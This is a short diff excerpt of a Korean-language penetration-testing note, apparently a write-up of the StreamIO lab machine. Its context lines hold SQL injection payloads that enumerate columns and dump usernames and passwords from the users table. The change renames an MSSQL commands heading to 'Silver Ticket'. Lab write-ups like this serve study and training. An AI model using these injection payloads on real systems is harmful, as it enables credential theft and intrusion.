@@ -275,7 +275,7 @@ select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,90157825
 SELECT 1,CONCAT(username,':',password),3,4,5,6 from streamio..users;-- -
 ```
 
-### MSSQL 명령
+### Silver Ticket
 ```mssql
 # MSSQL에 로그인 가능한 유저 확인(sysadmin 활성화 확인)
 enum_logins
